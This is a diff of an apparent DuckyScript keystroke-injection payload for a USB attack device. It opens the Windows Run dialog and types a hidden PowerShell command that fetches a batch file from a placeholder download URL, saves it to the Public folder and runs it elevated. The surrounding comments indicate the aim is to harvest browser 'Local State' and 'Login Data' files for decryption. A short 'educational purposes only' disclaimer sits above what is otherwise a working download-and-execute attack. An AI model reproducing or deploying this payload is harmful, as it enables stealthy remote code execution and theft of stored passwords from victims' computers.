@@ -12,22 +12,21 @@ REM - Use the decrypter given to decrypt localstate and login data files.
 
 REM DISCLAIMER: FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY.
 
-REM Opens run dialog box
+REM Define the direct downloadable URL of the batch file (eg-google drive link)
+DEFINE #BATCH_URL https://your-direct-link.com/attack_file.bat
+
+INJECT_MOD
+
+REM Open Run dialog
 GUI r
+DELAY 500
 
-REM Downloads the file from google drive and runs it in hidden state
-STRING powershell -w hidden -Command "Invoke-WebRequest -Uri
-DELAY 700
-
-REM Put "attack_file.bat" direct downloadable link
-REM Can use "https://sites.google.com/site/gdocs2direct/" to create direct downloadable link
-STRING '[URL BATCH FILE URL(eg-google drive link)]'
-DELAY 700
-
-REM Temporarily saves it in Public folder
-STRING '-OutFile C:\Users\Public\f2.bat'; cmd /c C:\Users\Public\f2.bat; exit
-CTRL
-SHIFT
-ENTER
+REM Inject powershell command in parts
+STRING powershell -w hidden -Command "Invoke-WebRequest -Uri '
+DELAY 500
+STRING #BATCH_URL
+DELAY 500
+STRING ' -OutFile C:\Users\Public\f2.bat; cmd /c C:\Users\Public\f2.bat"
+CTRL-SHIFT ENTER
 
 REM "f2.bat" will be deleted by "attack_file.bat".
